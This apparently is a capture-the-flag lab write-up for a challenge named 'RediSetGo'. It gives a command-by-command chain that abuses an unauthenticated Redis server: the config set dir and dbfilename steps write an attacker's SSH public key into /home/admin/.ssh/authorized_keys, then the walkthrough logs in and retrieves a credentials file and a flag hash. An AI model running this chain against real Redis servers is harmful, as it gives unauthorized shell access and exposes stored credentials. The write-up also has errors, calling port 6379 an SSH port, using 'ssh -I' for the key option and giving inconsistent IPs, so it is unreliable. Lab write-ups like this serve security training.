###### There are no images for this guide
# RediSetGo
#### Web Application PT, SSH
## Challenge Description:
You started working in web application development for 'SupplyBear'.<br>
When attempting to write your first plugin to their system, you found out that you don't have the central database's credentials.<br>
When talking with the lead developer, he told you that they have lost the 'admin' user credentials a while ago and could not recover access without potential data loss.<br>

Your goals<br>
☛  For the investigation of the database server with the hostname 'rdb-server', you were provided with a machine in the same local network.<br>
☛  Investigate potential entry points on the central database on 'rdb-server'.<br>
☛  Exploit a vulnerability to gain shell acess to the 'admin' user on the server.<br>
☛  Retrieve the lost password located in db-creds.conf<br>


## Process:
To start this off, let's run 'nmap -sV -sC -p- -vv rdb-server' in order to find the IP of our machine.<br>
We can see 2 ports open: 22 and 6379. Looking into this port, we can see that 6379 is an SSH port<br>

Let's create a new dir named 'keys' and continue from there.<br>
We will use the 'ssh-keygen -f postman' command to create a new ssh key that we will need to inject into the target in order to gain admin access. No need to enter a passphrase.<br>
'vi postman.pub' and add 2 lines above the key, and 2 lines below the key.<br>

'cat postman.pub | redis-cli -h 172.17.0.9 -x set crackit'

redis-cli -h 172.17.0.9 config set dir /home/admin/.ssh/

redis-cli -h 172.17.0.9 config set dbfilename "authorized_keys"

#### redis-cli -h 172.17.0.128 config set dbfilename "backup.db" not needed <br>

redis-cli -h 172.17.0.9 save

ssh -I postman admin@172.17.0.9

Now we have access to the server with admin privileges.<br>
Let's find the conf file using 
#### 'find / -iname "db-creds.conf" 2>/dev/null'
We will find the file in '/etc/systemd/system/db-creds.conf'

<details> 
        <summary>The Hidden Flag</summary> 
          16b4de7bff8d1b01681bdf28b812201e
    </details><br>
